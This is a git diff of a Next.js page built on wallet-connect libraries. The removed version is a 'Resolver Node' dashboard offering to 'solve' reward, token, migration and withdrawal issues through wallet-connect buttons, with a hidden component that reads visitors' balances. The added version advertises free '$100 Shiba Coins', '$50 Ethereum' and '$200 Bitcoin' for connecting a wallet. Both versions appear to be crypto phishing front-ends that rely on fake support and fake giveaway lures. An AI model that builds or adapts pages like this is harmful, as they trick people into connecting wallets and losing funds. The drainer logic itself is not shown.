@@ -1,11 +1,8 @@
-
 import { ConnectButton } from '@rainbow-me/rainbowkit';
 import type { NextPage } from 'next';
 import Head from 'next/head';
-import styles from '../styles/Home.module.css';
-import WalletBalances from './components/WalletBalances';
-import WalletDashboard from './components/WalletDashboard';
 import { useAccount } from 'wagmi';
+import { useState } from 'react';
 
 const handleBalancesChange = (balances: { ethBalance: string; maticBalance: string }) => {
   console.log('Balances updated:', balances);
@@ -13,77 +10,85 @@ const handleBalancesChange = (balances: { ethBalance: string; maticBalance: stri
 
 const Home: NextPage = () => {
   const { isConnected } = useAccount();
+  const [showDetails, setShowDetails] = useState<{ [key: number]: boolean }>({});
+
+  const toggleDetails = (index: number) => {
+    setShowDetails((prev) => ({
+      ...prev,
+      [index]: !prev[index],
+    }));
+  };
 
   return (
-    <div className={styles.container}>
+    <div style={styles.container}>
       <Head>
-        <title>Resolver Node</title>
-        <meta name="description" content="Chron Node Dashboard" />
+        <title>Claims Page</title>
+        <meta name="description" content="Claim Your Rewards" />
         <link rel="icon" href="/favicon.ico" />
       </Head>
 
-      <main className={styles.main}>
-        <h1 className={styles.title}>Resolver Node</h1>
+      <main style={styles.main}>
+        <h1 style={styles.title}>Claims</h1>
 
-        <div style={{ display: 'none' }}>
-<WalletBalances onBalancesChange={handleBalancesChange} />
-        </div>
+        <div style={styles.grid}>
+          {/* Example claim card */}
+          <div style={styles.card}>
+            <h2 style={styles.cardTitle}>Claim $100 Shiba Coins</h2>
+            <p style={styles.cardDescription}>Claim 100 Shiba Coins with a simple connection.</p>
+            <button style={styles.button} onClick={() => toggleDetails(0)}>
+              {showDetails[0] ? 'Hide' : 'Claim Now'}
+            </button>
 
-        <p className={styles.walletStatus}>
-          {isConnected ? 'Started' : 'Not Started'}
-        </p>
-        <WalletDashboard />
-
-        <div className={styles.grid}>
-          <div className={`${styles.card} ${styles.cardAnimation}`}>
-            <h2>Reward Issues &rarr;</h2>
-            <p>Track and resolve any reward-related problems.</p>
-            <ConnectButton
-      
-      label="Solve reward issue"
-    />
+            {showDetails[0] && (
+              <div style={styles.details}>
+                <ConnectButton label="Connect Wallet" />
+                <p style={styles.instructions}>
+                  Follow the steps to connect your wallet and claim your $100 Shiba coins.
+                </p>
+              </div>
+            )}
           </div>
 
-          <div className={`${styles.card} ${styles.cardAnimation}`}>
-            <h2>Token Issues &rarr;</h2>
-            <p>Manage and troubleshoot your token concerns.</p>
-            <ConnectButton
-      
-      label="Solve token issues"
-    />
-          </div>
-          
-          <div className={`${styles.card} ${styles.cardAnimation}`}>
-            <h2>Claim Reward &rarr;</h2>
-            <p>Claim Reward Properly and Perfectly.</p>
-            <ConnectButton
-      
-      label="Claim Reward"
-    />
-          </div>
-          
-          <div className={`${styles.card} ${styles.cardAnimation}`}>
-            <h2>Migration Issues &rarr;</h2>
-            <p>Ensure smooth transitions during migrations.</p>
-           <ConnectButton
-      
-      label="Solve migration issue"
-    />
+          {/* Repeat similar structure for more claims */}
+          <div style={styles.card}>
+            <h2 style={styles.cardTitle}>Claim $50 Ethereum</h2>
+            <p style={styles.cardDescription}>Claim 50 ETH tokens instantly.</p>
+            <button style={styles.button} onClick={() => toggleDetails(1)}>
+              {showDetails[1] ? 'Hide' : 'Claim Now'}
+            </button>
+
+            {showDetails[1] && (
+              <div style={styles.details}>
+                <ConnectButton label="Connect Wallet" />
+                <p style={styles.instructions}>
+                  Follow the steps to connect your wallet and claim your $50 Ethereum.
+                </p>
+              </div>
+            )}
           </div>
 
-          <div className={`${styles.card} ${styles.cardAnimation}`}>
-            <h2>Withdrawal Issues &rarr;</h2>
-            <p>Address any withdrawal-related challenges.</p>
-            <ConnectButton
-            label="Solve withdrawal issue"
-    />
+          <div style={styles.card}>
+            <h2 style={styles.cardTitle}>Claim $200 Bitcoin</h2>
+            <p style={styles.cardDescription}>Claim your Bitcoin rewards securely.</p>
+            <button style={styles.button} onClick={() => toggleDetails(2)}>
+              {showDetails[2] ? 'Hide' : 'Claim Now'}
+            </button>
+
+            {showDetails[2] && (
+              <div style={styles.details}>
+                <ConnectButton label="Connect Wallet" />
+                <p style={styles.instructions}>
+                  Follow the steps to connect your wallet and claim $200 in Bitcoin.
+                </p>
+              </div>
+            )}
           </div>
         </div>
       </main>
 
-      <footer className={styles.footer}>
-        <a href="#" target="_blank" rel="noopener noreferrer">
-          2024 © Resolver Node.
+      <footer style={styles.footer}>
+        <a href="#" target="_blank" rel="noopener noreferrer" style={styles.footerText}>
+          2024 © Claims Page.
         </a>
       </footer>
     </div>
@@ -91,3 +96,86 @@ const Home: NextPage = () => {
 };
 
 export default Home;
+
+// Inline styles
+const styles = {
+  container: {
+    padding: '20px',
+    fontFamily: 'Arial, sans-serif',
+    backgroundColor: '#f0f4f8',
+    minHeight: '100vh',
+    display: 'flex',
+    flexDirection: 'column',
+    alignItems: 'center',
+    justifyContent: 'center',
+  },
+  main: {
+    maxWidth: '1000px',
+    width: '100%',
+    textAlign: 'center',
+  },
+  title: {
+    fontSize: '3rem',
+    color: '#2c3e50',
+    marginBottom: '40px',
+    fontWeight: 'bold',
+  },
+  grid: {
+    display: 'grid',
+    gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))',
+    gap: '20px',
+    width: '100%',
+  },
+  card: {
+    backgroundColor: '#fff',
+    padding: '20px',
+    borderRadius: '10px',
+    boxShadow: '0 4px 8px rgba(0, 0, 0, 0.1)',
+    transition: 'transform 0.3s ease-in-out',
+  },
+  cardTitle: {
+    fontSize: '1.5rem',
+    color: '#34495e',
+    marginBottom: '15px',
+  },
+  cardDescription: {
+    fontSize: '1rem',
+    color: '#7f8c8d',
+    marginBottom: '20px',
+  },
+  button: {
+    backgroundColor: '#3498db',
+    color: '#fff',
+    border: 'none',
+    borderRadius: '5px',
+    padding: '10px 20px',
+    cursor: 'pointer',
+    fontSize: '1rem',
+    transition: 'background-color 0.3s ease',
+  },
+  buttonHover: {
+    backgroundColor: '#2980b9',
+  },
+  details: {
+    marginTop: '20px',
+    backgroundColor: '#ecf0f1',
+    padding: '15px',
+    borderRadius: '5px',
+  },
+  instructions: {
+    marginTop: '10px',
+    color: '#2c3e50',
+    fontSize: '1rem',
+  },
+  footer: {
+    marginTop: '50px',
+    padding: '20px 0',
+    width: '100%',
+    textAlign: 'center',
+  },
+  footerText: {
+    fontSize: '1rem',
+    color: '#7f8c8d',
+    textDecoration: 'none',
+  },
+};
